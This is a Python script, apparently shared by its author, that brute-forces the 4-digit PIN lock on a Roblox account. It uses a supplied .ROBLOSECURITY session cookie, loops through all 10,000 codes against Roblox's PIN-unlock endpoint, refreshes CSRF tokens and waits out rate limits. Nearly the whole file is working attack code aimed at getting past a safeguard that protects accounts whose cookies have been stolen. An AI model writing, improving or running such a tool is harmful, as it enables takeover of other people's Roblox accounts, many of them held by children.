import requests, time
from os import system

system("title " + "Roblox Pin Code Cracker,   Made By blob#0005,   Github: github.com/blob0005")

try:
    cookie = input("Enter Cookie: ")
    r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
except:
    print("Cookie Invalid")


combs = []

for i in range(9999+1):
    combs.append(str(i).zfill(4))


# you can set the input as a float when creating it, instead of setting its answer later on.
delay = float(input("enter delay in seconds (300 recommended): "))
if delay == '': delay = 300.0

req = requests.session()
req.cookies.set(".ROBLOSECURITY", str(cookie), domain="roblox.com")
url = "https://auth.roblox.com/v1/account/pin/unlock"
lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
token = str(lol.headers["x-csrf-token"])
headers = {
    "x-csrf-token": token
}

for pin in combs:
    print("if its not printing anything, you are probably being rate limited. its recommend to have 300-500 seconds as delay.")
    # no it doesnt takes 833 hours / 34 days / 50k minutes
    # print("At Maximum It Can Take 833 Hours Or 34 Days Or 50,000 Minutes (At Recomended Delay)")
    
    try:
        while True:
            json = {
                "pin": int(pin)
            }

            re = req.post(url=url, headers=headers, json=json)
            lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
            token = str(lol.headers["x-csrf-token"])

            re = str(re)

            if "200" in re:
                print("!!! Succsesfully Cracked Pin, Pin Is " + str(pin))
                input("press anything to exit...")
                exit()

            if "429" in re:
                print("/!\ >> Rate Limited, Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))

            if "403" in re:
                print("/!\ >> Invalid Pin, Pin Is Not "+str(pin)+", Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))
                break
    except:
        print("/!\ >> Unkown Error, Cookie May Expired, X Csrf Token May Be Invalid")